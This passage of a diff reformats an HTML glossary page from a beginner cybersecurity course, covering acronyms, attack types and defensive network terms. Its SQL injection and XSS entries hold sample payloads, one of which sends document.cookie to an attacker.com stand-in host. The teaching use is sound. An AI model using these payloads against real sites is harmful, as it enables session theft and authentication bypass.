+                            <td>Extended Detection and Response</td>
+                            <td>Evolution of EDR that integrates multiple security products into a unified platform</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">SOC</span></td>
+                            <td>Security Operations Center</td>
+                            <td>A centralized team that monitors, detects, and responds to security incidents 24/7</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">IDS</span></td>
+                            <td>Intrusion Detection System</td>
+                            <td>A system that monitors network traffic for suspicious activity and alerts administrators</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">IPS</span></td>
+                            <td>Intrusion Prevention System</td>
+                            <td>Like IDS, but can also take action to block detected threats automatically</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">WAF</span></td>
+                            <td>Web Application Firewall</td>
+                            <td>A firewall specifically designed to protect web applications from attacks like SQLi and XSS</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">MFA/2FA</span></td>
+                            <td>Multi-Factor/Two-Factor Authentication</td>
+                            <td>Requiring multiple forms of verification (password + code, biometrics, etc.)</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">VPN</span></td>
+                            <td>Virtual Private Network</td>
+                            <td>Creates an encrypted tunnel for secure communication over public networks</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">TLS/SSL</span></td>
+                            <td>Transport Layer Security / Secure Sockets Layer</td>
+                            <td>Cryptographic protocols for secure communication (HTTPS uses TLS)</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">HTTPS</span></td>
+                            <td>Hypertext Transfer Protocol Secure</td>
+                            <td>HTTP encrypted with TLS — the secure version of web browsing</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">SSH</span></td>
+                            <td>Secure Shell</td>
+                            <td>A cryptographic network protocol for secure remote login and command execution</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">DLP</span></td>
+                            <td>Data Loss Prevention</td>
+                            <td>Tools and policies that prevent sensitive data from leaving the organization</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">OSINT</span></td>
+                            <td>Open Source Intelligence</td>
+                            <td>Intelligence gathered from publicly available sources (social media, websites, etc.)</td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
 
-            <div class="term">
-                <div class="term-name">Decryption</div>
-                <div class="term-def">
-                    The reverse process of encryption — converting ciphertext back into readable plaintext 
-                    using the appropriate decryption key.
+            <!-- Attack Types Section -->
+            <h2 id="attack-types">⚔️ Attack Types</h2>
+
+            <div class="glossary-section">
+                <h3>Denial of Service Attacks</h3>
+
+                <div class="term">
+                    <div class="term-name">DoS (Denial of Service)</div>
+                    <div class="term-def">
+                        An attack aimed at making a system, service, or network unavailable to legitimate users. 
+                        Typically by overwhelming it with traffic or requests from a single source.
+                    </div>
                 </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Cipher</div>
-                <div class="term-def">
-                    An algorithm for performing encryption or decryption. Examples include AES (Advanced Encryption Standard), 
-                    RSA, and Blowfish.
+                <div class="term">
+                    <div class="term-name">DDoS (Distributed Denial of Service)</div>
+                    <div class="term-def">
+                        A DoS attack launched from multiple sources (often a botnet), making it much harder to 
+                        mitigate because you can't simply block one IP address.
+                    </div>
+                    <div class="term-example">
+                        Example: The 2016 Dyn DNS attack used the Mirai botnet to disrupt major websites like Twitter and Netflix.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: AES-256 is a widely used symmetric cipher considered secure for sensitive data.
+
+                <h3>Network Attacks</h3>
+
+                <div class="term">
+                    <div class="term-name">MITM (Man-in-the-Middle)</div>
+                    <div class="term-def">
+                        An attack where the attacker secretly intercepts and potentially alters communications between 
+                        two parties who believe they are communicating directly with each other.
+                    </div>
+                    <div class="term-example">
+                        Example: An attacker on public WiFi intercepting your login credentials to a website.
+                    </div>
                 </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Plaintext</div>
-                <div class="term-def">
-                    Data in its original, readable form before encryption. Also called "cleartext."
+                <div class="term">
+                    <div class="term-name">DNS Spoofing/Poisoning</div>
+                    <div class="term-def">
+                        Corrupting DNS cache data to redirect users to malicious websites. When you type a URL, 
+                        you're sent to an attacker-controlled server instead of the legitimate site.
+                    </div>
                 </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">Ciphertext</div>
-                <div class="term-def">
-                    Data that has been encrypted and is unreadable without the proper decryption key.
+                <div class="term">
+                    <div class="term-name">ARP Spoofing</div>
+                    <div class="term-def">
+                        Sending fake ARP (Address Resolution Protocol) messages to link the attacker's MAC address 
+                        with a legitimate IP address, enabling traffic interception on a local network.
+                    </div>
                 </div>
-            </div>
-        </div>
 
-        <!-- Acronyms Section -->
-        <h2 id="acronyms">🔤 Acronyms & Abbreviations</h2>
-
-        <div class="glossary-section">
-            <table>
-                <thead>
-                    <tr>
-                        <th>Acronym</th>
-                        <th>Full Form</th>
-                        <th>Description</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><span class="highlight">APT</span></td>
-                        <td>Advanced Persistent Threat</td>
-                        <td>Sophisticated, long-term cyberattacks, typically by nation-states, targeting specific organizations</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">CVE</span></td>
-                        <td>Common Vulnerabilities and Exposures</td>
-                        <td>A standardized identifier system for publicly known security vulnerabilities (e.g., CVE-2021-44228)</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">CVSS</span></td>
-                        <td>Common Vulnerability Scoring System</td>
-                        <td>A scoring system (0-10) that rates the severity of vulnerabilities</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">IOC</span></td>
-                        <td>Indicators of Compromise</td>
-                        <td>Artifacts that indicate a security breach (malicious IPs, file hashes, domains)</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">TTP</span></td>
-                        <td>Tactics, Techniques, and Procedures</td>
-                        <td>The behavior patterns and methods used by threat actors</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">SIEM</span></td>
-                        <td>Security Information and Event Management</td>
-                        <td>Centralized platform for collecting, analyzing, and correlating security logs (e.g., Splunk, QRadar)</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">EDR</span></td>
-                        <td>Endpoint Detection and Response</td>
-                        <td>Security tools that monitor endpoints for suspicious activity and enable response (e.g., CrowdStrike, Carbon Black)</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">XDR</span></td>
-                        <td>Extended Detection and Response</td>
-                        <td>Evolution of EDR that integrates multiple security products into a unified platform</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">SOC</span></td>
-                        <td>Security Operations Center</td>
-                        <td>A centralized team that monitors, detects, and responds to security incidents 24/7</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">IDS</span></td>
-                        <td>Intrusion Detection System</td>
-                        <td>A system that monitors network traffic for suspicious activity and alerts administrators</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">IPS</span></td>
-                        <td>Intrusion Prevention System</td>
-                        <td>Like IDS, but can also take action to block detected threats automatically</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">WAF</span></td>
-                        <td>Web Application Firewall</td>
-                        <td>A firewall specifically designed to protect web applications from attacks like SQLi and XSS</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">MFA/2FA</span></td>
-                        <td>Multi-Factor/Two-Factor Authentication</td>
-                        <td>Requiring multiple forms of verification (password + code, biometrics, etc.)</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">VPN</span></td>
-                        <td>Virtual Private Network</td>
-                        <td>Creates an encrypted tunnel for secure communication over public networks</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">TLS/SSL</span></td>
-                        <td>Transport Layer Security / Secure Sockets Layer</td>
-                        <td>Cryptographic protocols for secure communication (HTTPS uses TLS)</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">HTTPS</span></td>
-                        <td>Hypertext Transfer Protocol Secure</td>
-                        <td>HTTP encrypted with TLS — the secure version of web browsing</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">SSH</span></td>
-                        <td>Secure Shell</td>
-                        <td>A cryptographic network protocol for secure remote login and command execution</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">DLP</span></td>
-                        <td>Data Loss Prevention</td>
-                        <td>Tools and policies that prevent sensitive data from leaving the organization</td>
-                    </tr>
-                    <tr>
-                        <td><span class="highlight">OSINT</span></td>
-                        <td>Open Source Intelligence</td>
-                        <td>Intelligence gathered from publicly available sources (social media, websites, etc.)</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-
-        <!-- Attack Types Section -->
-        <h2 id="attack-types">⚔️ Attack Types</h2>
-
-        <div class="glossary-section">
-            <h3>Denial of Service Attacks</h3>
-
-            <div class="term">
-                <div class="term-name">DoS (Denial of Service)</div>
-                <div class="term-def">
-                    An attack aimed at making a system, service, or network unavailable to legitimate users. 
-                    Typically by overwhelming it with traffic or requests from a single source.
+                <div class="term">
+                    <div class="term-name">Session Hijacking</div>
+                    <div class="term-def">
+                        Taking over a user's authenticated session by stealing or predicting their session token. 
+                        Allows the attacker to impersonate the victim.
+                    </div>
                 </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">DDoS (Distributed Denial of Service)</div>
-                <div class="term-def">
-                    A DoS attack launched from multiple sources (often a botnet), making it much harder to 
-                    mitigate because you can't simply block one IP address.
-                </div>
-                <div class="term-example">
-                    Example: The 2016 Dyn DNS attack used the Mirai botnet to disrupt major websites like Twitter and Netflix.
-                </div>
-            </div>
+                <h3>Web Application Attacks</h3>
 
-            <h3>Network Attacks</h3>
-
-            <div class="term">
-                <div class="term-name">MITM (Man-in-the-Middle)</div>
-                <div class="term-def">
-                    An attack where the attacker secretly intercepts and potentially alters communications between 
-                    two parties who believe they are communicating directly with each other.
-                </div>
-                <div class="term-example">
-                    Example: An attacker on public WiFi intercepting your login credentials to a website.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">DNS Spoofing/Poisoning</div>
-                <div class="term-def">
-                    Corrupting DNS cache data to redirect users to malicious websites. When you type a URL, 
-                    you're sent to an attacker-controlled server instead of the legitimate site.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">ARP Spoofing</div>
-                <div class="term-def">
-                    Sending fake ARP (Address Resolution Protocol) messages to link the attacker's MAC address 
-                    with a legitimate IP address, enabling traffic interception on a local network.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Session Hijacking</div>
-                <div class="term-def">
-                    Taking over a user's authenticated session by stealing or predicting their session token. 
-                    Allows the attacker to impersonate the victim.
-                </div>
-            </div>
-
-            <h3>Web Application Attacks</h3>
-
-            <div class="term">
-                <div class="term-name">SQL Injection (SQLi)</div>
-                <div class="term-def">
-                    Inserting malicious SQL code into application queries to manipulate the database. 
-                    Can lead to data theft, modification, or deletion.
-                </div>
-                <div class="code-block">
-                    <code>
+                <div class="term">
+                    <div class="term-name">SQL Injection (SQLi)</div>
+                    <div class="term-def">
+                        Inserting malicious SQL code into application queries to manipulate the database. 
+                        Can lead to data theft, modification, or deletion.
+                    </div>
+                    <div class="code-block">
+                        <code>
 # Vulnerable query<br>
 SELECT * FROM users WHERE username='$username' AND password='$password'<br><br>
 # Malicious input: ' OR '1'='1' --<br>
@@ -1001,262 +830,264 @@ SELECT * FROM users WHERE username='$username' AND password='$password'<br><br>
 # This bypasses authentication!<br><br>
 # PREVENTION: Use parameterized queries (prepared statements)<br>
 # Example: SELECT * FROM users WHERE username=? AND password=?
-                    </code>
+                        </code>
+                    </div>
                 </div>
-            </div>
 
-            <div class="term">
-                <div class="term-name">XSS (Cross-Site Scripting)</div>
-                <div class="term-def">
-                    Injecting malicious scripts into web pages viewed by other users. Can steal cookies, 
-                    session tokens, or deface websites. Types: Stored, Reflected, DOM-based.
-                </div>
-                <div class="code-block">
-                    <code>
+                <div class="term">
+                    <div class="term-name">XSS (Cross-Site Scripting)</div>
+                    <div class="term-def">
+                        Injecting malicious scripts into web pages viewed by other users. Can steal cookies, 
+                        session tokens, or deface websites. Types: Stored, Reflected, DOM-based.
+                    </div>
+                    <div class="code-block">
+                        <code>
 &lt;!-- Example XSS payload --&gt;<br>
 &lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
-                    </code>
+                        </code>
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">CSRF (Cross-Site Request Forgery)</div>
+                    <div class="term-def">
+                        Tricking a victim's browser into making unwanted requests to a site where they're authenticated. 
+                        Can perform actions on behalf of the victim without their knowledge.
+                    </div>
+                    <div class="term-example">
+                        Example: A hidden form that transfers money when a logged-in banking user visits a malicious site.
+                    </div>
+                </div>
+
+                <h3>Password Attacks</h3>
+
+                <div class="term">
+                    <div class="term-name">Brute Force Attack</div>
+                    <div class="term-def">
+                        Systematically trying all possible combinations of passwords until the correct one is found. 
+                        Time-consuming but guaranteed to work eventually without protections.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Dictionary Attack</div>
+                    <div class="term-def">
+                        Using a list of common passwords, words, and phrases to guess credentials. 
+                        Faster than brute force because it targets likely passwords.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Credential Stuffing</div>
+                    <div class="term-def">
+                        Using username/password combinations leaked from one breach to try logging into 
+                        other services. Works because people reuse passwords across sites.
+                    </div>
+                    <div class="term-example">
+                        Example: Using credentials from the LinkedIn breach to access victims' banking accounts.
+                    </div>
+                </div>
+
+                <h3>Legacy/Classic Attacks</h3>
+
+                <div class="info-box">
+                    <strong>💡 Historical Context:</strong> These attacks are mostly mitigated in modern systems but 
+                    are important to understand for historical context and foundational knowledge.
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Ping of Death</div>
+                    <div class="term-def">
+                        Sending malformed or oversized ping packets to crash or freeze target systems. 
+                        Exploited poor handling of packet fragmentation. Largely patched in modern OS.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Smurf Attack</div>
+                    <div class="term-def">
+                        A DDoS attack that floods a target with ICMP echo replies by spoofing the victim's IP 
+                        and broadcasting to a network. Amplifies traffic significantly.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Teardrop Attack</div>
+                    <div class="term-def">
+                        Sending fragmented packets with overlapping offsets, causing older systems to crash 
+                        when trying to reassemble them.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">SYN Flood</div>
+                    <div class="term-def">
+                        A DoS attack that exploits the TCP handshake by sending many SYN requests without completing 
+                        the handshake, exhausting server resources. Still relevant today.
+                    </div>
                 </div>
             </div>
 
-            <div class="term">
-                <div class="term-name">CSRF (Cross-Site Request Forgery)</div>
-                <div class="term-def">
-                    Tricking a victim's browser into making unwanted requests to a site where they're authenticated. 
-                    Can perform actions on behalf of the victim without their knowledge.
+            <!-- Network & Defense Section -->
+            <h2 id="network-defense">🛡️ Network & Defense Terms</h2>
+
+            <div class="glossary-section">
+                <h3>Firewalls</h3>
+
+                <div class="term">
+                    <div class="term-name">Firewall</div>
+                    <div class="term-def">
+                        A network security device that monitors and filters incoming and outgoing traffic based on 
+                        defined security rules. Acts as a barrier between trusted and untrusted networks.
+                    </div>
                 </div>
-                <div class="term-example">
-                    Example: A hidden form that transfers money when a logged-in banking user visits a malicious site.
+
+                <div class="term">
+                    <div class="term-name">Packet Filtering Firewall</div>
+                    <div class="term-def">
+                        The simplest type of firewall that examines packets in isolation and makes decisions 
+                        based on source/destination IP, ports, and protocols. No awareness of connection state.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Stateful Firewall</div>
+                    <div class="term-def">
+                        A firewall that tracks the state of network connections and makes decisions based on the 
+                        context of the traffic (established connections vs. new connections).
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Next-Generation Firewall (NGFW)</div>
+                    <div class="term-def">
+                        Advanced firewalls that include features like deep packet inspection, application awareness, 
+                        intrusion prevention, and threat intelligence integration.
+                    </div>
+                </div>
+
+                <h3>Proxy & Privacy</h3>
+
+                <div class="term">
+                    <div class="term-name">Proxy Server</div>
+                    <div class="term-def">
+                        An intermediary server that handles requests between clients and servers. Can provide 
+                        anonymity, caching, content filtering, and security inspection.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Forward Proxy</div>
+                    <div class="term-def">
+                        A proxy that sits in front of clients, forwarding their requests to the internet. 
+                        Used for content filtering, caching, and anonymity.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Reverse Proxy</div>
+                    <div class="term-def">
+                        A proxy that sits in front of servers, handling requests from the internet. 
+                        Used for load balancing, SSL termination, and protecting backend servers.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">VPN (Virtual Private Network)</div>
+                    <div class="term-def">
+                        Creates an encrypted tunnel over the internet, allowing secure remote access to networks 
+                        or anonymous browsing. Types include site-to-site and remote access VPNs.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">TOR (The Onion Router)</div>
+                    <div class="term-def">
+                        A network that enables anonymous communication by routing traffic through multiple 
+                        volunteer-operated nodes, encrypting at each step. Used for privacy and accessing the dark web.
+                    </div>
+                </div>
+
+                <h3>Network Architecture</h3>
+
+                <div class="term">
+                    <div class="term-name">DMZ (Demilitarized Zone)</div>
+                    <div class="term-def">
+                        A network segment that sits between the public internet and the internal network. 
+                        Hosts public-facing services (web servers, email) while protecting internal resources.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">NAT (Network Address Translation)</div>
+                    <div class="term-def">
+                        A technique that maps private IP addresses to public IP addresses, allowing multiple 
+                        devices to share a single public IP. Provides some security by hiding internal IPs.
+                    </div>
+                </div>
+
+                <h3>Detection & Response</h3>
+
+                <div class="term">
+                    <div class="term-name">Honeypot</div>
+                    <div class="term-def">
+                        A decoy system designed to attract and detect attackers. Appears to be a vulnerable target 
+                        but actually monitors and logs attacker behavior.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Honeynet</div>
+                    <div class="term-def">
+                        A network of honeypots that simulates an entire network environment. Provides more 
+                        realistic attack scenarios for research and detection.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Sandboxing</div>
+                    <div class="term-def">
+                        Running suspicious files or programs in an isolated environment to analyze their behavior 
+                        without risking the production system. Used for malware analysis.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Endpoint Security</div>
+                    <div class="term-def">
+                        Security solutions that protect end-user devices (laptops, desktops, mobile) from threats. 
+                        Includes antivirus, EDR, device encryption, and access controls.
+                    </div>
+                </div>
+
+                <div class="term">
+                    <div class="term-name">Patch Management</div>
+                    <div class="term-def">
+                        The process of identifying, acquiring, testing, and installing software updates (patches) 
+                        to fix vulnerabilities and bugs. Critical for maintaining security.
+                    </div>
                 </div>
             </div>
 
-            <h3>Password Attacks</h3>
-
-            <div class="term">
-                <div class="term-name">Brute Force Attack</div>
-                <div class="term-def">
-                    Systematically trying all possible combinations of passwords until the correct one is found. 
-                    Time-consuming but guaranteed to work eventually without protections.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Dictionary Attack</div>
-                <div class="term-def">
-                    Using a list of common passwords, words, and phrases to guess credentials. 
-                    Faster than brute force because it targets likely passwords.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Credential Stuffing</div>
-                <div class="term-def">
-                    Using username/password combinations leaked from one breach to try logging into 
-                    other services. Works because people reuse passwords across sites.
-                </div>
-                <div class="term-example">
-                    Example: Using credentials from the LinkedIn breach to access victims' banking accounts.
-                </div>
-            </div>
-
-            <h3>Legacy/Classic Attacks</h3>
-
-            <div class="info-box">
-                <strong>💡 Historical Context:</strong> These attacks are mostly mitigated in modern systems but 
-                are important to understand for historical context and foundational knowledge.
-            </div>
-
-            <div class="term">
-                <div class="term-name">Ping of Death</div>
-                <div class="term-def">
-                    Sending malformed or oversized ping packets to crash or freeze target systems. 
-                    Exploited poor handling of packet fragmentation. Largely patched in modern OS.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Smurf Attack</div>
-                <div class="term-def">
-                    A DDoS attack that floods a target with ICMP echo replies by spoofing the victim's IP 
-                    and broadcasting to a network. Amplifies traffic significantly.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Teardrop Attack</div>
-                <div class="term-def">
-                    Sending fragmented packets with overlapping offsets, causing older systems to crash 
-                    when trying to reassemble them.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">SYN Flood</div>
-                <div class="term-def">
-                    A DoS attack that exploits the TCP handshake by sending many SYN requests without completing 
-                    the handshake, exhausting server resources. Still relevant today.
-                </div>
-            </div>
+            <!-- Page Navigation -->
+            <nav class="page-nav">
+                <a href="1.1-what-is-cybersecurity.html">
+                    <span>←</span>
+                    <span>Previous: What is Cybersecurity?</span>
+                </a>
+                <a href="1.3-landscape.html">
+                    <span>Next: The Cybersecurity Landscape</span>
+                    <span>→</span>
+                </a>
+            </nav>
         </div>
+    </main>
 
-        <!-- Network & Defense Section -->
-        <h2 id="network-defense">🛡️ Network & Defense Terms</h2>
+    <footer class="notes-footer">
+        <p>© 2026 lokii.tech | <a href="https://github.com/UnExplainableFish52/lokii.tech" target="_blank"></a>Open Source Project</a></p>
+    </footer>
 
-        <div class="glossary-section">
-            <h3>Firewalls</h3>
-
-            <div class="term">
-                <div class="term-name">Firewall</div>
-                <div class="term-def">
-                    A network security device that monitors and filters incoming and outgoing traffic based on 
-                    defined security rules. Acts as a barrier between trusted and untrusted networks.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Packet Filtering Firewall</div>
-                <div class="term-def">
-                    The simplest type of firewall that examines packets in isolation and makes decisions 
-                    based on source/destination IP, ports, and protocols. No awareness of connection state.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Stateful Firewall</div>
-                <div class="term-def">
-                    A firewall that tracks the state of network connections and makes decisions based on the 
-                    context of the traffic (established connections vs. new connections).
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Next-Generation Firewall (NGFW)</div>
-                <div class="term-def">
-                    Advanced firewalls that include features like deep packet inspection, application awareness, 
-                    intrusion prevention, and threat intelligence integration.
-                </div>
-            </div>
-
-            <h3>Proxy & Privacy</h3>
-
-            <div class="term">
-                <div class="term-name">Proxy Server</div>
-                <div class="term-def">
-                    An intermediary server that handles requests between clients and servers. Can provide 
-                    anonymity, caching, content filtering, and security inspection.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Forward Proxy</div>
-                <div class="term-def">
-                    A proxy that sits in front of clients, forwarding their requests to the internet. 
-                    Used for content filtering, caching, and anonymity.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Reverse Proxy</div>
-                <div class="term-def">
-                    A proxy that sits in front of servers, handling requests from the internet. 
-                    Used for load balancing, SSL termination, and protecting backend servers.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">VPN (Virtual Private Network)</div>
-                <div class="term-def">
-                    Creates an encrypted tunnel over the internet, allowing secure remote access to networks 
-                    or anonymous browsing. Types include site-to-site and remote access VPNs.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">TOR (The Onion Router)</div>
-                <div class="term-def">
-                    A network that enables anonymous communication by routing traffic through multiple 
-                    volunteer-operated nodes, encrypting at each step. Used for privacy and accessing the dark web.
-                </div>
-            </div>
-
-            <h3>Network Architecture</h3>
-
-            <div class="term">
-                <div class="term-name">DMZ (Demilitarized Zone)</div>
-                <div class="term-def">
-                    A network segment that sits between the public internet and the internal network. 
-                    Hosts public-facing services (web servers, email) while protecting internal resources.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">NAT (Network Address Translation)</div>
-                <div class="term-def">
-                    A technique that maps private IP addresses to public IP addresses, allowing multiple 
-                    devices to share a single public IP. Provides some security by hiding internal IPs.
-                </div>
-            </div>
-
-            <h3>Detection & Response</h3>
-
-            <div class="term">
-                <div class="term-name">Honeypot</div>
-                <div class="term-def">
-                    A decoy system designed to attract and detect attackers. Appears to be a vulnerable target 
-                    but actually monitors and logs attacker behavior.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Honeynet</div>
-                <div class="term-def">
-                    A network of honeypots that simulates an entire network environment. Provides more 
-                    realistic attack scenarios for research and detection.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Sandboxing</div>
-                <div class="term-def">
-                    Running suspicious files or programs in an isolated environment to analyze their behavior 
-                    without risking the production system. Used for malware analysis.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Endpoint Security</div>
-                <div class="term-def">
-                    Security solutions that protect end-user devices (laptops, desktops, mobile) from threats. 
-                    Includes antivirus, EDR, device encryption, and access controls.
-                </div>
-            </div>
-
-            <div class="term">
-                <div class="term-name">Patch Management</div>
-                <div class="term-def">
-                    The process of identifying, acquiring, testing, and installing software updates (patches) 
-                    to fix vulnerabilities and bugs. Critical for maintaining security.
-                </div>
-            </div>
-        </div>
-
-        <!-- Page Navigation -->
-        <nav class="page-nav">
-            <a href="1.1-what-is-cybersecurity.html">
-                <span>←</span>
-                <span>Previous: What is Cybersecurity?</span>
-            </a>
-            <a href="1.3-landscape.html">
-                <span>Next: The Cybersecurity Landscape</span>
-                <span>→</span>
-            </a>
-        </nav>
-
-        <footer>
-            <p>Module 1: Introduction to Cybersecurity | Lesson 1.2</p>
-            <p>Part of the Cybersecurity Beginner Course at projects.saksham.bio</p>
-        </footer>
-    </div>
+    <!-- Centralized JavaScript (handles scroll-to-top) -->
     <script src="../../js/main.js"></script>
 </body>
 </html>
